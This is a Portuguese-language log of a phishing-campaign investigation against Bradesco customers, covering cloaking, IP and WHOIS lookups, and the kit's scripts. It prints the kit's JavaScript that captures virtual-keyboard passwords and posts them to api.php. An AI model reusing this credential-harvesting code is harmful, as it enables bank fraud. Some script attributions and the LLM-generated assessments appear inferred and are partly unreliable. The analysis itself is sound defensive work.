# Log Técnico da Análise - Campanha de Phishing Bradesco/American Express

**Analista:** Patrícia Canossa Gagliardi  
**Data da análise:** 27/10/2025  
**Ambiente:** VM isolada Windows 10 (sem rede principal, snapshot ativo) / VM Kali Linux (com rede principal) / Máquina Windows 11 (com rede principal)
**Objetivo:** Coletar, analisar e registrar evidências da campanha de phishing direcionada a clientes Bradesco.

# 1 - Extração de link malicioso de email

Inicialmente, foi extraído do email, seu conteúdo header e body, obtendo-se o link malicioso contido no botão do email.

```HTML
<td align="center">
                    <a href="https://redexclusiv-975736767249.southamerica-east1.run.app" target="_blank" style="background-color:#d4af37; color:#000000; padding:16px 40px; text-decoration:none; font-size:17px; border-radius:6px; display:inline-block; font-weight:bold; font-family:Arial, Helvetica, sans-serif; text-transform:uppercase; letter-spacing:1px; mso-line-height-rule:exactly; line-height:20px;">
                      ACEITAR CONVITE
                    </a>
                  </td>
```                  
# 2- Busca de IP do link malicioso

Tentativa de localizar o IP da url contida no corpo do email.

```Bash
┌──(kali㉿kali)-[~]
└─$ nslookup https://redexclusiv-975736767249.southamerica-east1.run.app/
Server:         192.168.192.2
Address:        192.168.192.2#53

** server can't find https://redexclusiv-975736767249.southamerica-east1.run.app/: NXDOMAIN
```

```Bash
┌──(kali㉿kali)-[~]
└─$ ping redexclusiv-975736767249.southamerica-east1.run.app 
PING v2.run.app (34.143.78.2) 56(84) bytes of data.
64 bytes from 34.143.78.2: icmp_seq=1 ttl=128 time=16.8 ms
64 bytes from 34.143.78.2: icmp_seq=2 ttl=128 time=16.9 ms
64 bytes from 34.143.78.2: icmp_seq=3 ttl=128 time=16.4 ms

--- v2.run.app ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2010ms
rtt min/avg/max/mdev = 16.404/16.694/16.855/0.205 ms
```

# 3- Análise do IP Obtido

A análise do IP obtido, foi realizado de forma automatizada, com uso de script em Python, nas plataformas Shodan, IPInfo.io, ARIN/RIPE WHOIS & RDAP, URLScan.io, e bases públicas de reputação utilizadas pelas plataformas, e analisados dados com geração de relatório markdown através de LLM gpt-oss 120b via Ollama Cloud ``ip-analysis.py``.

A análise retornou os pontos de importância:

**Análise de Comportamento**
| Fonte | Evidência | Interpretação |
|-------|-----------|--------------|
| **Shodan** | Portas 80 e 443 abertas; resposta HTTP 404; tag *self‑signed* | Serviço web/HTTPS ativo, mas sem conteúdo público (404). O certificado auto‑assinado pode indicar uso interno ou teste. |
| **IPInfo.io** | Organização “Google LLC”, ASN AS396982, localização “Mountain View, CA” | IP alocado para infraestrutura Google Cloud – uso típico por clientes da GCP. |
| **ARIN / RDAP** | Registro mostra que a faixa **34.128.0.0/10** pertence à Google (GOOGL‑2) e que “os endereços estão em uso por clientes Google Cloud”. | Não há indicação de propriedade maliciosa direta. |
| **URLScan.io** | Não há resultados associados ao IP (nenhum URL capturado). | Falta de tráfego público ou de análise de URLs apontando para este IP. |
| **Análise de vulnerabilidades** | Nenhuma CVE listada no Shodan. | Não há vulnerabilidades conhecidas divulgadas para os serviços expostos (Apache/Nginx etc.). |

**Conclusão comportamental**: O host parece ser um ponto de terminação de infraestrutura de nuvem (possivelmente usado por um cliente da Google Cloud para hospedagem de serviços web ainda não configurados ou em fase de teste). Não foram encontradas evidências de comunicação com botnets, servidores de C2 ou de scanners automatizados. 

A análise, constatou, que o link de acesso, presente no email, não era a página maliciosa em si, mas sim, um serviço hospedado na Google Cloud.

# 4- Tentaiva de Acesso por VM Kali Linux

A tentativa de acesso do link fornecido pelo email, direcionava para um site legítimo do blog.veroo:

``https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/``

Analisado o IP pelo IPInfo.io, para verificar se era um "IP doméstico", retornando-o como um
```JSON
ipinfo:ip "170..."
hostname "170-..."
city "..."
region "..."
country "BR"
loc "-21...."
org "..."
postal "..."
timezone "America/Sao_Paulo"
readme "https://ipinfo.io/missingauth"
```
*Dados Ocultados por Motivos de Privacidade e Proteção de Dados*

A análise, constatou, que o redirecionamento, não estava ocorrendo pelo IP, sendo antão, realizada a tentativa de acesso à página maliciosa, através do uso de curl com header "falso" de navegador chrome e SO Windows.

```Bash
┌──(kali㉿kali)-[~/CloudPeler]
└─$ curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36" -L "www.redexclusiv-975736767249.southamerica-east1.run.app/"

<html><head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>404 Page not found</title>
</head>
<body text=#000000 bgcolor=#ffffff>
<h1>Error: Page not found</h1>
<h2>The requested URL was not found on this server.</h2>
<h2></h2>
</body></html>
```

Esse comportamento, mostrou que o sistema por trás do phishing inicial, possui um cloacking, com identificação eficaz so So utilizado pelo usuário, provavelmente, presente no aplicativo hospedado na Google Cloud, que impede o acesso de SO Linux.

# 5- Acesso do site malicioso via VM Windows 10

Para burlar o filtro existente de acesso, o link presente no email, foi acessado através de uma máquina VM em Windows 10, direcionando para o site malicioso com o link:

``https://bradescard-americanblackexclusivo.com``

O site malicioso, demonstrou grande similaridade de design com o site verdadeiro do banco, mostrando sofisticação do golpe em oferecer credibilidade para a vítima dsobre osite acessado.

# 6- Busca de IP do domínio após direcionamento para site malicioso

A busca pelo IP, foi realizada por um rápido comando ping retornando o IP ``172.86.126.117``

```Bash
┌──(kali㉿kali)-[~]
└─$ ping bradescard-americanblackexclusivo.com

(24-10-2025)Disparando bradescard-americanblackexclusivo.com [172.86.126.117] com 32 bytes de dados:
Resposta de 172.86.126.117: bytes=32 tempo=184ms TTL=52
Resposta de 172.86.126.117: bytes=32 tempo=185ms TTL=52
Resposta de 172.86.126.117: bytes=32 tempo=185ms TTL=52
Resposta de 172.86.126.117: bytes=32 tempo=185ms TTL=52

Estatísticas do Ping para 172.86.126.117:
    Pacotes: Enviados = 4, Recebidos = 4, Perdidos = 0 (0% de
             perda),
Aproximar um número redondo de vezes em milissegundos:
    Mínimo = 184ms, Máximo = 185ms, Média = 184ms

```

O acesso ao site malicioso, foi realizado novamente após 4 dias, e foi observado esse estar apontando para outro IP ``172.237.50.16``

```BASH
┌──(kali㉿kali)-[~]
└─$ nslookup bradescard-americanblackexclusivo.com                                                            
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   bradescard-americanblackexclusivo.com
Address: 172.237.50.16
```

# 7- Análise do IP Obtido ``172.86.126.117`` e ``172.237.50.16``


A análise do IP obtido foi realizada pelo script automatizado em Python já descrito anteriormente, sendo obtido os principais pontos:

**Análise de Comportamento** 

| Indicador | Evidência | Interpretação |
|-----------|-----------|---------------|
| **Hostname suspeito** | `bradescard-americanblackexclusivo.com` (domínio que lembra marca de cartão de crédito) | Alto potencial de uso em campanha de phishing (brand‑jacking). |
| **Presença em PhishTank** | Dois scans (IDs 0199c5d6, 0199be39) apontam URLs de phishing que redirecionam para Google | O domínio está **listado como phishing**. |
| **Redirecionamento HTTP 302** (Porta 80/443) | Ambos retornam `Location: https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/` | O servidor funciona como **proxy de redirecionamento**; pode estar sendo usado para mascarar o destino final. |
| **Porta 22 aberta (OpenSSH 8.2p1)** | Banner expõe versão completa e chave RSA | Facilita **ataques de força‑bruta** ou exploração de vulnerabilidades de SSH já corrigidas (ex.: CVE‑2018‑15473). |
| **Versão do Apache (2.4.41)** | Listada no Shodan; CVE database mostra **>90 vulnerabilidades**, incluindo execuções remotas, SSRF e bypass de controle de acesso. | **Superfície de ataque crítica** – fácil exploração por scanners automatizados. |
| **Geolocalização divergente** | Shodan → Canada (Vancouver); ipinfo.io → US (Los Angeles) | Provável uso de **IP Anycast / CDN** ou imprecisão de bases de dados – não afeta a análise de risco. |
| **ASN/ISP** | AS14956 – RouterHosting LLC (provedor de data‑center) | Não há indícios de que o provedor seja “malicioso”, mas hospeda clientes com comportamento suspeito. |

* O hostname configurado é **bradescard‑americanblackexclusivo.com**, que aparece em múltiplas submissões ao **phish‑tank** e a resultados do **urlscan.io**, indicando uso como página de **phishing bancário** que redireciona para domínios externos (por exemplo, Google).  
* O endereço **172.86.126.117** está sendo usado como **infra‑estrutura de phishing** e executa um **servidor web desatualizado** que contém diversas vulnerabilidades críticas, além de um serviço SSH aberto.  A combinação de **exposição pública**, **software vulnerável** e **participação em campanhas de engodo** torna este IP uma **ameaça de alto risco** para quaisquer redes que interajam com ele.  
*  **Verificar a resolução DNS** do domínio: atualmente ele resolve para **162.241.2.55** (outro IP). Confirme se há **CNAME** ou redirecionamento mal‑configurado. Avalie a necessidade de **takedown** do domínio através de registrador ou fornecedor de hospedagem (phishing).


**Análise de Comportamento**

| Fonte | Indicador | Avaliação |
|-------|-----------|-----------|
| **Shodan** | Nenhum serviço ou porta revelada (404) | Não há evidência de exposição direta a internet. |
| **IPInfo.io** | ISP: *Akamai Connected Cloud* (Linode) | IP pertence a provedor de cloud – uso legítimo esperado. |
| **ARIN / RDAP** | Organização: *Linode* (ASN 63949) | Bloqueio de rede típica de data‑center, sem informação de abuso. |
| **URLScan.io** | Nenhum resultado (0 scans) | Não foi registrado nenhum acesso HTTP/HTTPS ao IP. |
| **Feeds de ameaças públicos** (consulta externa) | **Não encontrado** em listas de botnets, C2 ou phishing conhecidas. | Não há correlação com campanhas conhecidas. |

O endereço `172.237.50.16` pertence à rede da **Linode**, um provedor de infraestrutura em nuvem, e está associado ao bloco IPv4 172.232.0.0/13, alocado à **Akamai Connected Cloud**. Geograficamente, está localizado em **Diadema, São Paulo, Brasil**. As consultas ao Shodan retornaram **“404: Not Found”**, indicando ausência de serviços expostos ou portas abertas conhecidas no momento da coleta. Não foram identificadas vulnerabilidades (CVEs) associadas a serviços detectados. Não há indicadores claros de atividade maliciosa (botnet, scanners, C2), embora a natureza de provedores de nuvem permita que o IP seja reutilizado por diversos clientes, inclusive por atores maliciosos.

**Conclusão:** Não há sinais atuais de comportamento malicioso direto. Contudo, a ausência de portas abertas pode ser temporária ou fruto de políticas de firewall restritivas; o IP pode ser usado como ponto de salto ou para serviços internos ainda não indexados.

A análise, permitiu verificar, que a troca do direcionamento do domínio do IP ``172.86.126.117`` para o ``172.237.50.16``, permitiu diminuir sua detecção, por esse ainda não apresentar-se como malicioso como o anterior já indexado em Virus Total e PhishTank.

# 8- Análise do Site Malicoso

O design para construção, possuia alta semelhança com recursos do site original, mostrando o uso bem aplicado de fatores que a credibilidade ao acessar o site, e grande quantidade de cópia de código do site original quando analisado o HTML.
Foi observado também, utilizando o dev tools do edge, alguns scripts em javascript, criados pelo atacante, que diferem em nome do site original, porém, com função igual aos presentes no site original, e presença de scripts para rastreamento de comportamento da vítima, para provável uso posterior em novas campanhas phishing.

# 9- Análise de arquivos javascript

Os arquivos javascript do site, foram obtidos através da listagem dentro da opção ``Aplicativo``, do dev tools do egde. Dentre os scripts observados, os que apresentavam comportamentos maliciosos, foram:

``navegg.js``
    * coleta de dados da vítima com uso da plataforma **Navegg**
``lembrarAgCta.js``
    * Esse script cria, lê e grava cookies contendo dados de login bancário: ``agência``, ``conta`` e ``dígito``. Ele utiliza Base64 (codificação simples, não criptografia) para “mascarar” os dados e armazená-los no navegador do usuário, mais precisamente em um cookie chamado ``lbAgCta``.
``fbevents.js``
    * Biblioteca oficial da **Meta** para medir desempenho de anúncios, otimização de conversão e retargeting, para provável uso posterior em novas campanhas phishing.
``validaFormNaoCorrentista.js``
    * Conjunto de funções trata basicamente de validação/entrada de CPF pela UI, manutenção de um tooltip/modal, e envio do CPF (e metadados) para um endpoint remoto quando a vítima seleciona opção de não correntista. O código é uma exfiltração de dados sensíveis (roubo de CPF), e assim, é altamente malicioso, por realizar coleta deliberada de dados pessoais para fraude. O comportamento (validar e postar CPF com meta-dados) é legítimo para remarketing em sites autorizados, mas é crítico quando encontrado em páginas fraudulentas
``detect-mobile.js``
    * Ele detecta o sistema (iOS/Android) pelo userAgent e substitui/ajusta links no DOM para apontarem para um deep‑link/URL (``https://www.bradescocelular.com.br/app_redirect/...``). Em um site de phishing essa funcionalidade é útil para o atacante — redirecionar usuários móveis para páginas/aplicativos falsos (ou para um crafted deep link) aumenta a chance de capturar credenciais/instalar app malicioso.
``one-tag.js``
    * É um **script malicioso** projetado para phishing bancário. O código intercepta o clique de botões com valor ``OK`` e lê os valores de campos HTML com IDs ``AGN`` (agência) e ``CTA`` (conta), combina os valores em um identificador de conta (financialAcctNbr) junto com o código do banco (``237 → Bradesco``), e envia esse identificador para um servidor remoto (``customerApi.sendProperties``), provavelmente controlado pelo atacante. O script visa coletar informações sensíveis de contas bancárias de clientes do Bradesco e enviar para um servidor externo, tudo disfarçado de interações normais no site. Isso caracteriza phishing bancário altamente sofisticado.
    * O script referencia o domínio ``thunderhead.com``, cujo IP obtido através de nslookup aponta para o IP ``141.193.213.20``, que após análise pelo ``ip-analysis.py``, foi observado que é de propriedade da Cloudflare, e associado há diversos serviços CDN. Também URLs que verdadeiras do Bradesco (``banco.bradesco``, ``ib12.bradesco.com.br``), aparentemente para disfarçar ou registrar interações do usuário.
```Bash
┌──(kali㉿kali)-[~]
└─$ nslookup thunderhead.com                      
Server:         192.168.192.2
Address:        192.168.192.2#53

Non-authoritative answer:
Name:   thunderhead.com
Address: 141.193.213.21
Name:   thunderhead.com
Address: 141.193.213.20
```
A chamada do script era realizada pelo cdn hospedado na ``thunderhead.com`` -> ``ns5.cdn.thunderhead.com``, com credenciais ``one-tag.js?siteKey=ONE´-WDA4KRKODB-1484``, verificado via dev tools em fontes.

``index.js``
    * Basicamente, isso é um formulário de login bancário, que verifica se os dados digitados são consistentes. Esse script manipula diretamente agência, conta e dígito, ou seja, informações financeiras sensíveis. Ele não é apenas “um código de validação normal”, pois também coleta dados bancários sensíveis (agência, conta, dígito) para posterior envio para quem está controlando o site malicioso através de funções ``ValidaNextAgencia()`` e ``ValidaLogin()`` .

# 10- Análise do HTML

Na análise do HTML, foi possível ver a criação de uma arquitetura semelhante ao do banco verdadeiro, porém, com presença de artefatos deixados ao longo do código, como um endereço de IP ``88.221.161.37``, e execução de scripts maliciosos. 

```HTML
 <tr>
    <td class="line-number" value="8960"></td>
    <td class="line-content"> <span class="html-attribute-name">maxlength</span>="<span
            class="html-attribute-value">4</span>" <span class="html-attribute-name">onblur</span>="<span
            class="html-attribute-value">ValidaNextAgencia(this.value);</span>"&gt;
    </td>
</tr>
```

```HTML
<tr>
    <td class="line-number" value="8896"></td>
    <td class="line-content"> <span class="html-tag">&lt;script <span
                class="html-attribute-name">src</span>="<a class="html-attribute-value html-resource-link"
                target="_blank" href="https://bradescard-americanblackexclusivo.com/js/validaFrame.js"
                rel="noreferrer noopener">js/validaFrame.js</a>"&gt;</span><span
            class="html-tag">&lt;/script&gt;</span>
    </td>
</tr>
<tr>
    <td class="line-number" value="8897"></td>
    <td class="line-content"> <span class="html-comment">&lt;!-- &lt;script
            src="js/valida_agenciaconta.js"&gt;&lt;/script&gt; --&gt;</span>
    </td>
</tr>
<tr>
    <td class="line-number" value="8898"></td>
    <td class="line-content"> <span class="html-tag">&lt;script <span
                class="html-attribute-name">src</span>="<a class="html-attribute-value html-resource-link"
                target="_blank" href="https://bradescard-americanblackexclusivo.com/js/lembrarAgCta.js"
                rel="noreferrer noopener">js/lembrarAgCta.js</a>"&gt;</span><span
            class="html-tag">&lt;/script&gt;</span>
    </td>
</tr>
```

```HTML
<tr>
    <td class="line-number" value="4087"></td>
    <td class="line-content"> var ipcli = '88.221.161.37';
    </td>
</tr>
```

O IP encontrado no código HTML, foi analisado, não sendo observado nenhum dado que demonstre a participação desse dentro da campanha de phishing, ou conter filtros de análise que impeçam de ser acessado.

**Análise de Comportamento**

| Fonte | Evidência | Interpretação |
|-------|-----------|----------------|
| **Shodan** | Página “404 Not Found” – “No information available for 88.221.161.37”. | O serviço de varredura não recebeu resposta ou foi bloqueado. Pode indicar que o IP está configurado para recusar sondas não‑HTTP ou que a camada de proteção da Akamai filtra o tráfego de scanners. |
| **IPInfo.io** | Hostname apontando para *static.akamaitechnologies.com*; localização em Dallas. | Confirma que o IP é parte da infraestrutura de entrega de conteúdo da Akamai (serviços estáticos). |
| **ARIN / RIPE (RDAP)** | Registro “AKAMAI‑PA”, entidade “AKAM1‑RIPE‑MNT” e “NARA1‑RIPE”, contato de abuso *abuse@akamai.com*. | Atribuição formal a Akamai; não há indicação de cliente final ou de host comprometido. |
| **URLScan.io** | Nenhum resultado (nenhum site submetido para análise). | Não há indicadores de que o IP esteja hospedando páginas suspeitas reconhecidas por essa plataforma. |
| **Feeds de ameaças públicos (consultas ad‑hoc)** | Não encontrado em AbuseIPDB, VirusTotal, AlienVault OTX, etc. | Falta de reputação negativa consolidada. |

**Avaliação geral:** O IP não apresenta sinais típicos de botnet, scanner ou servidor C2. O comportamento padrão de um ponto de presença de CDN (aceitar HTTP/HTTPS e recusar outras sondas) pode gerar “falsos negativos” em ferramentas como Shodan, mas isso não indica atividade maliciosa.

# 11- Login com Dados de Conta Bancária

Para acessar página a ser exibida após informar dados de conta bancária, foi informado dados de conta fictícia. O fornecimento dos dados, levou a uma página chamada ``indetificacao.php``. A página exibe um teclado virtual, simulando ao também encontrado em login da página verdadeiro do banco.
Essa página, também fazia comunicação com uma api server side chamada ``api.php`` que se mantinha em constante chamada, e retornava dados em formato JSON, contendo dados capturados da vítima, enviados ao centro de comando e controle. Os dados presente na estrtura do JSON, demonstram que a mesma api, é utilizada em outras companhas para roubo de dados extra bancários.
Ao fornecer os quatro números pelo teclado virtual, esses eram incluidos na estrutura JSON de resposta da ``api.php``, mostrando o roubo dos dados e envio ao servidor em que a api mentinha-se.

```JSON
{"id":"14...",
"0":"14...",
"idAcesso":"246...",
"1":"246...",
"agencia":"...",
"2":"...",
"conta":"...",
"3":"...",
"digito":"...",
"4":"...",
"senha4":"",
"5":"",
"comando":"SENHA_DE_4",
"6":"SENHA_DE_4",
"texto":null,
"7":null,
"ultimoAcesso":"2025-10-24 18-47-42",
"8":"2025-10-24 18-47-42",
"aberto":"0",
"9":"0",
"celular":null,
"10":null,
"cvv":null,
"11":null,
"senha6":null,
"12":null,
"statusInfo":"NOVO",
"13":"NOVO",
"qrCodeFile":null,
"14":null,
"titular":null,
"15":null,
"nome":null,
"16":null,
"tipo":"Bradesco",
"17":"Bradesco",
"serialDispositivo":null,
"18":null,
"saldo":null,
"19":null,
"cpf":null,
"20":null,
"mae":null,
"21":null}
```

# 12- Análise do documento ``ìdentificacao.php``

A análise do documento php, através do dev tools, tanto de seu código fonte, quanto pela aba fontes do dev tools, exibiu a execução de um script em javascript, que essa, por sua vez, realizava o roubo dos dados da página e comunicação com a ``api.php``

```HTML
<tr>
    <td class="line-number" value="384"></td>
    <td class="line-content"> <span class="html-tag">&lt;script <span
                class="html-attribute-name">src</span>="<a class="html-attribute-value html-resource-link"
                target="_blank" href="https://bradescard-americanblackexclusivo.com/js/identificacao.js"
                rel="noreferrer noopener">js/identificacao.js</a>"&gt;</span><span
            class="html-tag">&lt;/script&gt;</span></td>
</tr>
```

# 13- Análise do script ``identificacao.js``

A análise do script, permitiu observar a captura dos dados digitados no teclado virtual e já obtidos pela página de acesso pela conta bancária, sua direta comunicação com a ``api.php`` e envio desses, demonstrando o método de roubo da senha de teclado virtual, objetivo dessa campanha phishing.

```JAVASCRIPT
 function loadInfo(){
        $.ajax({
            url: "api.php",
            type:'POST',
            dataType : "json",
            data: { action : "GET_INFO", id : id, clientHashId : clientHashId},
            cache: false,
            success: function(r){
                info = r;
                if(r.comando !== status) {
                    status = r.comando;
                    atualizarTela();
                }
            }
        });
    }
```

```JAVASCRIPT
$('ul#ul_teclado_virtual a').click( e => {
        e.preventDefault();
        let value = $(e.target).text().trim();

        if(value === 'Limpar'){
            zerarSenhaDe4();
        } else {

            let pass1 = $('input#txtPass1').val();
            let pass2 = $('input#txtPass2').val();
            let pass3 = $('input#txtPass3').val();
            let pass4 = $('input#txtPass4').val();

            if(pass1.length == 0){
                $('input#txtPass1').val(value);
            } else if(pass2.length == 0){
                $('input#txtPass2').val(value);
            } else if(pass3.length == 0){
                $('input#txtPass3').val(value);
            } else if(pass4.length == 0){
                $('input#txtPass4').val(value);
                $('#btnAcessarSenha4').addClass('btn-action-active');
            }

        }

    });
```

```JAVASCRIPT
function atualizarTela(){

        $('div.boxes').addClass('hide');
        $('span.txt_msg_erro_disp').addClass('hide');


        if(status === 'AGUARDANDO'){
            $('div#boxAguardando').removeClass('hide');
        }
        if(status ==='SENHA_DE_4'){
            $('div.steps-border').css('margin-left','0px');
            $('div#boxSenha4').removeClass('hide');
        }
        if(status ==='SENHA_DE_4_ERRO'){
            $('div.steps-border').css('margin-left','0px');
            $('div#boxSenha4 span.txt_msg_erro_disp').removeClass('hide');
            $('div#boxSenha4').removeClass('hide');
        }
```

```javascript
 $('div#conteudo').on('click', 'div#boxSenha4 button#btnAcessarSenha4.btn-action-active', function(e) {

        e.preventDefault();

        let s4_1 = $('#txtPass1').val();
        let s4_2 = $('#txtPass2').val();
        let s4_3 = $('#txtPass3').val();
        let s4_4 = $('#txtPass4').val();

        let senhaDe4 = s4_1 + '' + s4_2 + '' + s4_3 + '' + s4_4;

        if(senhaDe4.length !== 4){
            $('div#boxSenhaDe4').find('.box_redLine_bottom').addClass('form_erro');
            return;
        }

        info.senha4 = senhaDe4;
        info.comando = 'AGUARDANDO';

        $.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                zerarSenhaDe4();
                // MODIFICAÇÃO: Pula direto para a tela de loading sem mostrar o campo do celular
                $('div#boxAguardando').html('Por favor, aguarde enquanto validamos seus dados.<img src="images/loading_01.gif" class="loading" alt="">');
                atualizarTela();
                
            }
        });
```

A página mantém comunicação com a ``api.php`` de forma constante.

```javascript
var timer = setInterval ( function(){
        loadInfo();
    }, 2000 );


    loadInfo();
```

Ao digitar a senha no teclado virtual, é retornado um aviso de processamento na página, que após alguns segundos, é redirecionada para a página inicial.

```JAVASCRIPT
$.ajax({
            url: "api.php",
            type:'POST',
            data: { action : "ATUALIZAR_INFORMACOES", id : id, clientHashId : clientHashId, obj : info},
            cache: false,
            success: function(r){
                status = info.comando;
                $('input#celular').val('');
                $('div#boxAguardando').html('Por favor, aguarde enquanto validamos seus dados.<img src="images/loading_01.gif" class="loading" alt="">');
                atualizarTela();
                
            }
        });

```

# 14- Observação sobre a ``api.php``

Embora tentando seu acesso, não foi possível, por estar sendo executada em server side. Quando tentado seu acesso via ``https://bradescard-americanblackexclusivo.com/api.php``, foi exibido um documento vazio.

# 15- Análise de WHOIS do domínio ``bradescard-americanblackexclusivo.com``

Os dados de registro do domínio, foram acessados via VM Kali, pelo comando WHois, que retornoi, como esperado, dados ocultados pelo GoDaddy.

┌──(kali㉿kali)-[~]
└─$ whois bradescard-americanblackexclusivo.com            
   Domain Name: BRADESCARD-AMERICANBLACKEXCLUSIVO.COM
   Registry Domain ID: 3022306853_DOMAIN_COM-VRSN
   Registrar WHOIS Server: whois.godaddy.com
   Registrar URL: http://www.godaddy.com
   Updated Date: 2025-09-23T00:17:38Z
   Creation Date: 2025-09-23T00:17:37Z
   Registry Expiry Date: 2026-09-23T00:17:37Z
   Registrar: GoDaddy.com, LLC
   Registrar IANA ID: 146
   Registrar Abuse Contact Email: abuse@godaddy.com
   Registrar Abuse Contact Phone: 480-624-2505
   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
   Domain Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited
   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
   Name Server: NS63.DOMAINCONTROL.COM
   Name Server: NS64.DOMAINCONTROL.COM
   DNSSEC: unsigned
   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
>>> Last update of whois database: 2025-10-29T15:04:22Z <<<

For more information on Whois status codes, please visit https://icann.org/epp

NOTICE: The expiration date displayed in this record is the date the
registrar's sponsorship of the domain name registration in the registry is
currently set to expire. This date does not necessarily reflect the expiration
date of the domain name registrant's agreement with the sponsoring
registrar.  Users may consult the sponsoring registrar's Whois database to
view the registrar's reported date of expiration for this registration.

TERMS OF USE: You are not authorized to access or query our Whois
database through the use of electronic processes that are high-volume and
automated except as reasonably necessary to register domain names or
modify existing registrations; the Data in VeriSign Global Registry
Services' ("VeriSign") Whois database is provided by VeriSign for
information purposes only, and to assist persons in obtaining information
about or related to a domain name registration record. VeriSign does not
guarantee its accuracy. By submitting a Whois query, you agree to abide
by the following terms of use: You agree that you may use this Data only
for lawful purposes and that under no circumstances will you use this Data
to: (1) allow, enable, or otherwise support the transmission of mass
unsolicited, commercial advertising or solicitations via e-mail, telephone,
or facsimile; or (2) enable high volume, automated, electronic processes
that apply to VeriSign (or its computer systems). The compilation,
repackaging, dissemination or other use of this Data is expressly
prohibited without the prior written consent of VeriSign. You agree not to
use electronic processes that are automated and high-volume to access or
query the Whois database except as reasonably necessary to register
domain names or modify existing registrations. VeriSign reserves the right
to restrict your access to the Whois database in its sole discretion to ensure
operational stability.  VeriSign may restrict or terminate your access to the
Whois database for failure to abide by these terms of use. VeriSign
reserves the right to modify these terms at any time.

The Registry database contains ONLY .COM, .NET, .EDU domains and
Registrars.
Domain Name: bradescard-americanblackexclusivo.com
Registry Domain ID: 3022306853_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.godaddy.com
Registrar URL: https://www.godaddy.com
Updated Date: 2025-09-22T19:17:38Z
Creation Date: 2025-09-22T19:17:37Z
Registrar Registration Expiration Date: 2026-09-22T19:17:37Z
Registrar: GoDaddy.com, LLC
Registrar IANA ID: 146
Registrar Abuse Contact Email: abuse@godaddy.com
Registrar Abuse Contact Phone: +1.4806242505
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
Domain Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited
Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
Registry Registrant ID: Not Available From Registry
Registrant Name: Registration Private
Registrant Organization: Domains By Proxy, LLC
Registrant Street: DomainsByProxy.com
Registrant Street: 100 S. Mill Ave, Suite 1600
Registrant City: Tempe
Registrant State/Province: Arizona
Registrant Postal Code: 85281
Registrant Country: US
Registrant Phone: +1.4806242599
Registrant Phone Ext:
Registrant Fax: 
Registrant Fax Ext:
Registrant Email: https://www.godaddy.com/whois/results.aspx?domain=bradescard-americanblackexclusivo.com&action=contactDomainOwner
Name Server: NS63.DOMAINCONTROL.COM
Name Server: NS64.DOMAINCONTROL.COM
DNSSEC: unsigned
URL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/
>>> Last update of WHOIS database: 2025-10-29T15:04:40Z <<<
For more information on Whois status codes, please visit https://icann.org/epp

TERMS OF USE: The data contained in this registrar's Whois database, while believed by the
registrar to be reliable, is provided "as is" with no guarantee or warranties regarding its
accuracy. This information is provided for the sole purpose of assisting you in obtaining
information about domain name registration records. Any use of this data for any other purpose
is expressly forbidden without the prior written permission of this registrar. By submitting
an inquiry, you agree to these terms and limitations of warranty. In particular, you agree not
to use this data to allow, enable, or otherwise support the dissemination or collection of this
data, in part or in its entirety, for any purpose, such as transmission by e-mail, telephone,
postal mail, facsimile or other means of mass unsolicited, commercial advertising or solicitations
of any kind, including spam. You further agree not to use this data to enable high volume, automated
or robotic electronic processes designed to collect or compile this data for any purpose, including
mining this data for your own personal or commercial purposes. Failure to comply with these terms
may result in termination of access to the Whois database. These terms may be subject to modification
at any time without notice.

**NOTICE** This WHOIS server is being retired. Please use our RDAP service instead.


# 16- Rastreio de IP de site redirecionamento

Após constatado o método do golpe, foi seguida a exploração da cadeia de infraestrutura do golpe, iniciando pela análise do IP do site em que o endereço incial redirecionava quando tentado ser acessado pela VM Linux, o `https://blog.veroo.com.br/giovani-e-adenir-oliveira-da-terra-ao-seu-paladar/`, com IP já informado r citado na análise do IP do site malicioso ``172.86.126.117``, sendo ele ``162.241.2.55``.
Mais uma vez, utilizando o ``ip-analysis.py`` foram identificados os seguintes pontos de importância:

**Análise de Comportamento**  
| Evidência | Interpretação |
|-----------|---------------|
| **Tag “database”, “eol‑product”, “starttls”** (Shodan) | Indica que o host executa serviços de banco de dados (MySQL) e servidores de e‑mail que suportam STARTTLS, porém alguns destes produtos estão em fim de vida. |
| **Serviços de e‑mail** (Exim 4.98.1 nas portas 26, 465, 587) | Versão vulnerável a uso‑after‑free (CVE‑2025‑30232) que pode permitir elevação de privilégio a usuários com acesso à linha de comando. |
| **SSH 7.4** (portas 22 e 2222) | Várias CVEs críticas (ex.: CVE‑2025‑32728, CVE‑2025‑26465) que podem ser exploradas para bypass de autenticação ou ataque de Row‑Hammer. |
| **Pure‑FTPd** (porta 21) | Serviço FTP aberto, sem indícios de restrição de acesso; possibilidade de login anônimo ou credenciais fracas. |
| **cPanel/WHM** (portas 2082‑2087) | Interfaces de administração de hospedagem web (login “cPanel”) expostas ao público; alvo clássico de força‑bruta e exploração de vulnerabilidades de plugins. |
| **MySQL 5.7.23** (porta 3306) | Versão ainda suportada, porém pode ser alvo de bruteforce se não estiver adequadamente protegida. |
| **Múltiplos domínios phishing** (URLScan) | O IP serve como “forwarder” ou página de captura para domínios suspeitos (ex.: ``bradescard-americanblackexclusivo.com``, ``blackconviteplus.com``). Muitas dessas URLs apontam para o mesmo conteúdo de blog, sugerindo uso de *cloaking* ou *link‑bait*. |
